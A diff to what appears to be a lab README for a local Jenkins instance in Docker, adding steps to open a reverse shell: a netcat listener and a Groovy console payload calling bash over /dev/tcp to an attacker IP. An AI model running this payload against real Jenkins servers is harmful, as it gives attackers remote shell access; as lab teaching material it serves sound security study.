@@ -20,4 +20,9 @@
 - If successful, you should get an error message "ERROR: No such command" followed by the file content
 
 
-	
+# Executing a reverse shell
+- In your machine's terminal, start a netcat listener with `nc -l <port_num>` (replace <port_num> with any unused port number)
+- You must obtain your computer's IP address as seen by Docker. On Mac you can find this with the command `ipconfig getifaddr en0`
+- Assuming your Jenkins server is running, go to `[http://localhost:8080/script](http://localhost:8080/script)`. Log in as the admin account if you have not already.
+- Paste and execute this payload into the Groovy script console: `['bash', '-c', 'bash -i >& /dev/tcp/<attacker_ip>/<port_num> 0>&1'].execute()`
+- Go back to the terminal with the netcat listener. You should be in the Jenkins server's file system and able to do anything the admin user can.
